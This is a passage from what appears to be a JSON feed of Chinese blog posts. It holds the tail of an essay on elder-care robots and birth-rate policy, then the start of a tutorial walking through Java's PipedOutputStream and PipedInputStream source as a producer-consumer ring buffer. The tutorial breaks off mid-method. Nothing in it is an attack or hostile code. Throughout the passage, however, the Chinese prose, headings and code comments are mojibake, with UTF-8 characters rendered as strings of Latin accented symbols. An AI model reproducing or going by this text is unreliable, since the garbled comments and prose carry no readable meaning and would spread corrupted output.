¸å¿ƒé›¶éƒ¨ä»¶å›½äº§åŒ–ç‡è¶…60%ï¼Œæˆæœ¬æŒç»­ä¸‹é™ã€‚å…»è€æœºå™¨äººäº§ä¸šé“¾ä¸äººå½¢æœºå™¨äººé«˜åº¦ååŒï¼Œè¿œæœŸæ½œåœ¨å¸‚åœºç©ºé—´è¶…ä¸‡äº¿å…ƒã€‚</p>\n<p>æ”¯ä»˜ç«¯ä¹Ÿåœ¨é€æ­¥å®Œå–„ï¼šåŸºæœ¬å…»è€ä¿é™©ã€é•¿æœŸæŠ¤ç†ä¿é™©ã€å•†ä¸šå…»è€é‡‘èæ„æˆä¸‰é‡ä¿éšœã€‚æœºå™¨äººäº§ä¸šè¶Šæˆç†Ÿï¼Œå…»è€æˆæœ¬è¶Šä½ï¼Œç§‘æŠ€è¿›æ­¥çš„çº¢åˆ©æœ€ç»ˆä¼šè½åˆ°æ™®é€šäººèº«ä¸Šã€‚</p>\n<h2 id=\"äº”å®ˆä½åº•çº¿ä¸ªäººé€‰æ‹©ä¸å›½å®¶æˆ˜ç•¥çš„å¹³è¡¡\">äº”ã€å®ˆä½åº•çº¿ï¼šä¸ªäººé€‰æ‹©ä¸å›½å®¶æˆ˜ç•¥çš„å¹³è¡¡</h2>\n<p>å›åˆ°å¼€å¤´é‚£äº›å¹´è½»äººçš„çƒ­è®®â€”â€”â€œä¸ç”Ÿå¨ƒã€å­˜é’±ä¹°æœºå™¨äººå…»è€â€ã€‚ä»ä¸ªäººè§’åº¦ï¼Œè¿™æ˜¯ä¸€ä¸ªç†æ€§çš„é€‰æ‹©ï¼Œä¸å€¼å¾—æŒ‡è´£ã€‚ä½†å›½å®¶å¿…é¡»å®ˆä½ä¸€æ¡åº•çº¿ï¼šç”Ÿè‚²ç‡éœ€è¦ç»´æŒåœ¨1.2å·¦å³ï¼Œç¡®ä¿æœ‰è¶³å¤Ÿçš„äººå£æ”¯æ’‘ç ”å‘ã€è¿ç»´å’Œåˆ›æ–°ã€‚</p>\n<p>åº¦è¿‡æœªæ¥åå¹´çš„å±é™©å¹³è¡¡æœŸï¼Œéœ€è¦ä¸‰ç®¡é½ä¸‹ï¼šä¸€æ˜¯åŠ å¿«æœºå™¨äººæŠ€æœ¯ç ”å‘å’Œæˆæœ¬ä¸‹é™ï¼ŒäºŒæ˜¯å®Œå–„é•¿æœŸæŠ¤ç†ä¿é™©å’Œå…»è€é‡‘ä½“ç³»ï¼Œä¸‰æ˜¯é€‚å½“é¼“åŠ±ç”Ÿè‚²å®ˆä½äººå£å®‰å…¨çº¿ã€‚</p>\n<p>æœªæ¥çš„ç¤¾ä¼šï¼Œå°†æ˜¯å¤šå…ƒå…±ç”Ÿçš„æ ¼å±€ï¼šä¸€éƒ¨åˆ†å®¶åº­ç”Ÿè‚²ï¼Œå®ˆä½äººå£åŸºç¡€ï¼›ä¸€éƒ¨åˆ†äººå‚¨è“„ï¼Œäº«å—ç§‘æŠ€çº¢åˆ©ï¼›æœºå™¨äººå¡«è¡¥åŠ³åŠ¨åŠ›ç¼ºå£ã€‚ä¸ªäººé€‰æ‹©ä¸å›½å®¶å‘å±•ä¸æ˜¯å¯¹ç«‹çš„ï¼Œè€Œæ˜¯äº’è¡¥çš„ã€‚</p>\n<p>æ˜¥æ™šé‚£å‡ ä¸ªæ‰“æ‹³èˆå‰‘çš„æœºå™¨äººï¼Œæ‰“å¼€çš„ä¸ä»…æ˜¯ä¸€ä¸ªèŠ‚ç›®çš„çª—å£ã€‚å®ƒé¢„ç¤ºç€ä¸€ä¸ªç”±ç§‘æŠ€é©±åŠ¨ã€æ•ˆç‡æ”¯æ’‘ã€èµ„é‡‘ä¿éšœã€äººå£æ‰˜åº•çš„æ–°æ—¶ä»£ã€‚ä½†é€šå‘è¿™ä¸ªæ—¶ä»£çš„è·¯ä¸Šï¼Œæœ‰åå¹´å·¦å³çš„è‰°éš¾å¹³è¡¡æœŸéœ€è¦è·¨è¶Šã€‚è·¨è¿‡å»ï¼Œå°±æ˜¯ç§‘æŠ€è®©ç”Ÿæ´»æ›´å®‰ç¨³ã€è®©å…»è€æ›´æœ‰å°Šä¸¥ã€è®©å›½å®¶å‘å±•æ›´å¯æŒç»­çš„æœªæ¥ã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n</div>\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-02-17 19:03</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xdesigner\">è¢æ°¸ç¦ ç”µå­ç—…å†ï¼ŒåŒ»ç–—ä¿¡æ¯åŒ–</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">288</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n\n\t\t</p>"
    },
    {
      "title": "9ã€PipedInputStreamå’ŒPipedOutputStreamçš„æºç åˆ†æå’Œä½¿ç”¨æ–¹æ³•è¯¦ç»†åˆ†æ",
      "link": "https://www.cnblogs.com/Carey-ccl/p/19625392",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Carey-ccl/p/19625392\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 22:07\">\n    <span>9ã€PipedInputStreamå’ŒPipedOutputStreamçš„æºç åˆ†æå’Œä½¿ç”¨æ–¹æ³•è¯¦ç»†åˆ†æ</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>â€ƒâ€ƒåœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ï¼Œçº¿ç¨‹é—´çš„æ•°æ®äº¤æ¢æ˜¯ä¸€ä¸ªå¸¸è§éœ€æ±‚ã€‚Java IOåŒ…ä¸­çš„PipedInputStreamå’ŒPipedOutputStreamæä¾›äº†ä¸€ç§é«˜æ•ˆçš„çº¿ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œå…è®¸ä¸€æ‰¹ï¼ˆå¤šä¸ªï¼‰çº¿ç¨‹å‘PipedOutputStreamå†™å…¥æ•°æ®ï¼Œå¦ä¸€æ‰¹ï¼ˆå¤šä¸ªï¼‰çº¿ç¨‹ä»PipedInputStreamè¯»å–æ•°æ®ã€‚<br />\nâ€ƒâ€ƒä½†æ˜¯ï¼ŒåŒä¸€æ‰¹ï¼ˆå¤šä¸ªï¼‰çº¿ç¨‹ç›¸äº’ä¹‹é—´ä¼šå­˜åœ¨ç«äº‰ï¼Œæ¯”å¦‚ï¼ŒåŒä¸€æ‰¹å‘PipedOutputStreamå†™å…¥æ•°æ®çš„çº¿ç¨‹ä¼šå­˜åœ¨ç«äº‰ï¼ŒåŒä¸€æ‰¹ä»PipedInputStreamè¯»å–æ•°æ®çš„çº¿ç¨‹ä¹Ÿä¼šå­˜åœ¨ç«äº‰ã€‚å› æ­¤PipedInputStreamå’ŒPipedOutputStreamä¸­çš„çº¿ç¨‹å®‰å…¨éœ€è¦é€šè¿‡synchronizedå…³é”®å­—å’Œwait()/notifyAll()æœºåˆ¶å®ç°ã€‚ä¸å»ºè®®åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­åŒæ—¶ä½¿ç”¨PipedInputStreamå’ŒPipedOutputStreamï¼Œå› ä¸ºè¿™æ ·å¯èƒ½ä¼šå¯¼è‡´è¿™ä¸ªçº¿ç¨‹é™·å…¥æ­»é”çŠ¶æ€ã€‚<br />\nâ€ƒâ€ƒPipedInputStreamå’ŒPipedOutputStreamä¹‹é—´çš„é€šä¿¡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹ï¼Œå…¶ä¸­PipedOutputStreamä½œä¸ºç”Ÿäº§è€…ï¼ŒPipedInputStreamä½œä¸ºæ¶ˆè´¹è€…ã€‚ä¸¤è€…é€šè¿‡ä¸€ä¸ªå¾ªç¯ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¿›è¡Œæ•°æ®äº¤æ¢ï¼ŒPipedOutputStreamå°†æ•°æ®ç¼“å­˜åœ¨PipedInputStreamçš„æ•°ç»„å½“ä¸­ï¼Œç­‰å¾…PipedInputStreamçš„è¯»å–ã€‚<br />\nâ€ƒâ€ƒPipedInputStreamå’ŒPipedOutputStreamçš„UMLå…³ç³»å›¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h4 id=\"ä¸€pipedoutputstreamç”Ÿäº§è€…æºç å‘pipedinputstreamæ¶ˆè´¹è€…ä¸­çš„ç¼“å†²åŒºbyteæ•°ç»„å†™å…¥å­—èŠ‚æ•°æ®çš„è¾“å‡ºstreamç”Ÿäº§è€…\">ä¸€ã€PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰æºç â€”â€”å‘PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å†™å…¥å­—èŠ‚æ•°æ®çš„è¾“å‡ºStreamï¼ˆç”Ÿäº§è€…ï¼‰</h4>\n<pre><code>package java.io;\n\nimport java.io.*;\n\npublic\nclass PipedOutputStream extends OutputStream {\n    //ä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰\n    private PipedInputStream sink;\n    \n    //æ„é€ å‡½æ•°\n    public PipedOutputStream(PipedInputStream snk)  throws IOException {\n        connect(snk);//è°ƒç”¨connect()å‡½æ•°ï¼Œæ¥æ”¹å˜PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­ä¸€äº›å˜é‡çš„å€¼\n    }\n    \n    //æ„é€ å‡½æ•°\n    public PipedOutputStream() {\n    }\n    \n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šç”¨æ¥æ”¹å˜å°†è¦å…³è”çš„PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­ä¸€äº›å˜é‡çš„å€¼\n    public synchronized void connect(PipedInputStream snk) throws IOException {\n        if (snk == null) {\n            throw new NullPointerException();//å¦‚æœå°†è¦å…³è”çš„PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸ºnullï¼ŒæŠ›å‡ºNullPointerException\n        } else if (sink != null || snk.connected) {\n            //å¦‚æœä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰!=nullæˆ–è€…å°†è¦å…³è”çš„PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„boolean connectedå˜é‡ä¸ºtrueï¼Œåˆ™æŠ›å‡ºIOException\n            throw new IOException(\"Already connected\");\n        }\n        sink = snk;//å°†è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ä¸è¿™ä¸ªPipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”\n        snk.in = -1;//æ”¹å˜PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„å˜é‡int in=-1\n        snk.out = 0;//æ”¹å˜PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„å˜é‡int out=0\n        snk.connected = true;//æ”¹å˜PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„å˜é‡boolean connected=true\n    }\n    \n    //å‘ä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å†™å…¥1ä¸ªå­—èŠ‚\n    public void write(int b)  throws IOException {\n        if (sink == null) {\n             //å¦‚æœä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰== nullï¼ŒæŠ›å‡ºIOException\n            throw new IOException(\"Pipe not connected\");\n        }\n        sink.receive(b);//æœ€ç»ˆè°ƒç”¨çš„æ˜¯è¿™ä¸ªç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„receive(int b)å‡½æ•°\n    }\n    \n    //å‘ä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å†™å…¥byte[]æ•°ç»„bçš„[off,off+len)ï¼ˆå·¦é—­å³å¼€ï¼Œä¸åŒ…æ‹¬off+lenï¼‰ç´¢å¼•ä½ç½®çš„å­—èŠ‚\n    public void write(byte b[], int off, int len) throws IOException {\n        if (sink == null) {\n            //å¦‚æœä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰== nullï¼ŒæŠ›å‡ºIOException\n            throw new IOException(\"Pipe not connected\");\n        } else if (b == null) {\n            throw new NullPointerException();//å¦‚æœbyte[]æ•°ç»„b==nullï¼ŒæŠ›å‡ºä¸€ä¸ªNullPointerException\n        } else if ((off &lt; 0) || (off &gt; b.length) || (len &lt; 0) ||\n                   ((off + len) &gt; b.length) || ((off + len) &lt; 0)) {//byte[]æ•°ç»„bçš„[off,off+len)ï¼ˆå·¦é—­å³å¼€ï¼‰ç´¢å¼•ä½ç½®æ˜¯å¦æœ‰è¶Šç•Œçš„æ£€æŸ¥\n            throw new IndexOutOfBoundsException();//è¶Šç•Œçš„è¯ï¼ŒæŠ›å‡ºä¸€ä¸ªIndexOutOfBoundsException\n        } else if (len == 0) {\n            return;//å¦‚æœlen==0ï¼Œç»“æŸæœ¬æ¬¡å‡½æ•°è°ƒç”¨\n        }\n        sink.receive(b, off, len);//æœ€ç»ˆè°ƒç”¨çš„æ˜¯è¿™ä¸ªç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„receive(byte b[], int off, int len)å‡½æ•°\n    }\n    \n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šä½¿ç”¨notifyAll()å‡½æ•°å”¤é†’æ‰€æœ‰ä¸è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ç›¸å…³è”çš„ PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çº¿ç¨‹ï¼ˆè¿™ä¸ªæ¶ˆè´¹è€…å¯ä»¥ç»‘å®š1~å¤šä¸ªçº¿ç¨‹ï¼‰\n    public synchronized void flush() throws IOException {\n        if (sink != null) {\n            synchronized (sink) {\n                sink.notifyAll();\n            }\n        }\n    }\n    //å…³é—­è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ï¼Œè¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ä¸èƒ½å†å‘ä¸å®ƒç›¸å…³è”çš„PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å†™å…¥å­—èŠ‚æ•°æ®\n    public void close()  throws IOException {\n        if (sink != null) {\n            sink.receivedLast();\n        }\n    }\n}\n</code></pre>\n<h4 id=\"äºŒpipedinputstreamæ¶ˆè´¹è€…æºç ä»è‡ªå·±çš„ç¼“å†²åŒºbyteæ•°ç»„è¯»å–å­—èŠ‚æ•°æ®çš„è¾“å…¥streamæ¶ˆè´¹è€…\">äºŒã€PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰æºç â€”â€”ä»è‡ªå·±çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¯»å–å­—èŠ‚æ•°æ®çš„è¾“å…¥Streamï¼ˆæ¶ˆè´¹è€…ï¼‰</h4>\n<pre><code>package java.io;\n\npublic class PipedInputStream extends InputStream {\n    //æ ‡è®°ç¬¦ï¼štrueè¡¨ç¤ºä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å·²ç»å…³é—­ï¼Œåä¹‹ï¼Œåä¹‹\n    boolean closedByWriter = false;\n    //æ ‡è®°ç¬¦ï¼štrueè¡¨ç¤ºå½“å‰è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰å·²ç»å…³é—­äº†ï¼Œåä¹‹ï¼Œåä¹‹\n    volatile boolean closedByReader = false;\n    //æ ‡è®°ç¬¦ï¼štrueè¡¨ç¤ºä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å·²ç»æŒæœ‰äº†è¿™ä¸ªPipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰å¯¹è±¡ï¼ˆæˆ–è€…å«å·²ç»è¿æ¥ä¸Šäº†ï¼‰ï¼Œåä¹‹ï¼Œåä¹‹\n    boolean connected = false;\n\n    Thread readSide;//å½“å‰æ¶ˆè´¹çš„çº¿ç¨‹\n    Thread writeSide;//å½“å‰ç”Ÿäº§è€…çš„çº¿ç¨‹\n    \n    //é»˜è®¤çš„PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦\n    private static final int DEFAULT_PIPE_SIZE = 1024;\n\n    //PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰\n    protected byte buffer[];\n    //ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆ\n    protected int in = -1;\n    //ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¯»æŒ‡é’ˆ\n    protected int out = 0;\n    //æ„é€ å‡½æ•°\n    public PipedInputStream(PipedOutputStream src) throws IOException {\n        this(src, DEFAULT_PIPE_SIZE);//ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ä½¿ç”¨é»˜è®¤å€¼1024\n    }\n\n    //æ„é€ å‡½æ•°\n    public PipedInputStream(PipedOutputStream src, int pipeSize)\n            throws IOException {\n         initPipe(pipeSize);//ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ä½¿ç”¨æŒ‡å®šçš„é•¿åº¦\n         //æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„connect()å‡½æ•°ï¼Œå¹¶æŠŠè‡ªèº«å¯¹è±¡thisä¼ é€’è¿›å»ï¼Œç„¶ååœ¨PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„connect()å‡½æ•°ä¸­ï¼Œæ”¹å˜è‡ªå·±çš„3ä¸ªå˜é‡int in=-1ã€int out=0ã€boolean connected=true\n         connect(src);\n    }\n    \n    //æ„é€ å‡½æ•°ï¼Œç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ä½¿ç”¨é»˜è®¤å€¼1024\n    public PipedInputStream() {\n        initPipe(DEFAULT_PIPE_SIZE);\n    }\n\n    //æ„é€ å‡½æ•°ï¼Œç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ä½¿ç”¨æŒ‡å®šçš„é•¿åº¦\n    public PipedInputStream(int pipeSize) {\n        initPipe(pipeSize);\n    }\n    \n    //åˆå§‹åŒ–ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰\n    private void initPipe(int pipeSize) {\n         if (pipeSize &lt;= 0) {\n            throw new IllegalArgumentException(\"Pipe Size &lt;= 0\");\n         }\n         buffer = new byte[pipeSize];\n    }\n\n    public void connect(PipedOutputStream src) throws IOException {\n        src.connect(this); //æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„connect()å‡½æ•°ï¼Œå¹¶æŠŠè‡ªèº«å¯¹è±¡thisä¼ é€’è¿›å»ï¼Œç„¶ååœ¨PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„connect()å‡½æ•°ä¸­ï¼Œæ”¹å˜è‡ªå·±çš„3ä¸ªå˜é‡int in=-1ã€int out=0ã€boolean connected=true\n    }\n    \n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šè¯¥å‡½æ•°åªè¢«PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„write(int b)å‡½æ•°è°ƒç”¨\n    protected synchronized void receive(int b) throws IOException {\n        checkStateForReceive();//æ£€æŸ¥PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„çŠ¶æ€\n        writeSide = Thread.currentThread();//å½“å‰æ‰§è¡Œè¯¥å‡½æ•°çš„çº¿ç¨‹ï¼Œå°±æ˜¯ç”Ÿäº§è€…çº¿ç¨‹\n        if (in == out)\n            //å¦‚æœç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¯»æŒ‡é’ˆ==ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆï¼Œå”¤é†’æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè‡ªå·±è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹è°ƒç”¨wait(1000)å‡½æ•°\n            awaitSpace();\n        if (in &lt; 0) {//ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆ&lt;0æ—¶ï¼Œè®¾ç½®ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆ=0ï¼Œç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¯»æŒ‡é’ˆ=0\n            in = 0;\n            out = 0;\n        }\n        buffer[in++] = (byte)(b &amp; 0xFF);//å‘ç¼“å†²åŒºçš„å†™æŒ‡é’ˆä½ç½®å†™å…¥1ä¸ªå­—èŠ‚\n        if (in &gt;= buffer.length) {\n            in = 0;//å¦‚æœç¼“å†²åŒºæ»¡äº†ï¼Œè®¾ç½®ç¼“å†²åŒºçš„å†™æŒ‡é’ˆ=0\n        }\n    }\n\n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šè¯¥å‡½æ•°åªè¢«PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰çš„write(byte b[], int off, int len)å‡½æ•°è°ƒç”¨\n    synchronized void receive(byte b[], int off, int len)  throws IOException {\n        checkStateForReceive();//æ£€æŸ¥PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„çŠ¶æ€\n        writeSide = Thread.currentThread();//å½“å‰æ‰§è¡Œè¯¥å‡½æ•°çš„çº¿ç¨‹ï¼Œå°±æ˜¯ç”Ÿäº§è€…çº¿ç¨‹\n        int bytesToTransfer = len;//ç”Ÿäº§è€…çº¿ç¨‹è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ€»é‡\n        while (bytesToTransfer &gt; 0) {\n            if (in == out)\n                //å¦‚æœç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¯»æŒ‡é’ˆ==ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆï¼Œå”¤é†’æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè‡ªå·±è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹è°ƒç”¨wait(1000)å‡½æ•°\n                awaitSpace();\n            int nextTransferAmount = 0;//æœ¬æ¬¡ç”Ÿäº§è€…çº¿ç¨‹è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡\n            if (out &lt; in) {\n                //å¦‚æœç¼“å†²åŒºçš„è¯»æŒ‡é’ˆ&lt;ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼Œæœ¬æ¬¡è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡=ç¼“å†²åŒºçš„é•¿åº¦-ç¼“å†²åŒºçš„å†™æŒ‡é’ˆ\n                nextTransferAmount = buffer.length - in;\n            } else if (in &lt; out) {\n                if (in == -1) {\n                    in = out = 0;\n                    //å¦‚æœç¼“å†²åŒºçš„è¯»æŒ‡é’ˆï¼ˆoutï¼‰&gt; ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰å¹¶ä¸”ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰=-1ï¼Œå…ˆè®¾ç½®ç¼“å†²åŒºçš„è¯»ï¼ˆoutï¼‰ã€å†™ï¼ˆinï¼‰æŒ‡é’ˆ=0ï¼Œæœ¬æ¬¡è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡=ç¼“å†²åŒºçš„é•¿åº¦\n                    nextTransferAmount = buffer.length - in;\n                } else {\n                    //å¦‚æœç¼“å†²åŒºçš„è¯»æŒ‡é’ˆï¼ˆoutï¼‰&gt; ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰å¹¶ä¸”ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰=-1ï¼Œæœ¬æ¬¡è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡=è¯»æŒ‡é’ˆï¼ˆoutï¼‰-å†™æŒ‡é’ˆï¼ˆinï¼‰\n                    nextTransferAmount = out - in;\n                }\n            }\n            //æœ¬æ¬¡ç”Ÿäº§è€…çº¿ç¨‹è¦å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡æœ€å¤šä¸ºlenï¼Œä¸‹æ¬¡ä¸ºlen-æœ¬æ¬¡å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡å†™å…¥çš„åŸºäºlenä¸ªå­—èŠ‚å¾ªç¯é€’å‡ä¸Šä¸€æ¬¡å†™å…¥çš„\n            if (nextTransferAmount &gt; bytesToTransfer)\n                nextTransferAmount = bytesToTransfer;\n            assert(nextTransferAmount &gt; 0);\n            System.arraycopy(b, off, buffer, in, nextTransferAmount);//å‘ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„[in,in+nextTransferAmount)ç´¢å¼•ä½ç½®å†™å…¥byte[]æ•°ç»„bä¸­[off,off+nextTransferAmount)ç´¢å¼•ä½ç½®çš„å­—èŠ‚ï¼Œéƒ½æ˜¯å·¦é—­å³å¼€ã€‚\n            bytesToTransfer -= nextTransferAmount;//æ¯ä¸€æ¬¡éƒ½åŸºäºlenä¸ªå­—èŠ‚å¾ªç¯é€’å‡æœ¬æ¬¡å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡nextTransferAmount\n            off += nextTransferAmount;//å°†ä¸‹æ¬¡è¦ä»byte[]æ•°ç»„bä¸­å–å­—èŠ‚çš„èµ·å§‹ç´¢å¼•çš„ä½ç½®ï¼ˆåç§»é‡ï¼‰+æœ¬æ¬¡å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡nextTransferAmount\n            in += nextTransferAmount;//å°†ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰+æœ¬æ¬¡å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å­—èŠ‚æ•°é‡nextTransferAmount\n            if (in &gt;= buffer.length) {\n                in = 0;//å¦‚æœç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰&gt; ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ï¼Œè®¾ç½®ç¼“å†²åŒºçš„å†™æŒ‡é’ˆï¼ˆinï¼‰=0\n            }\n        }\n    }\n\n    //æ£€æŸ¥PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰çš„çŠ¶æ€\n    private void checkStateForReceive() throws IOException {\n        if (!connected) {\n            throw new IOException(\"Pipe not connected\");\n        } else if (closedByWriter || closedByReader) {\n            throw new 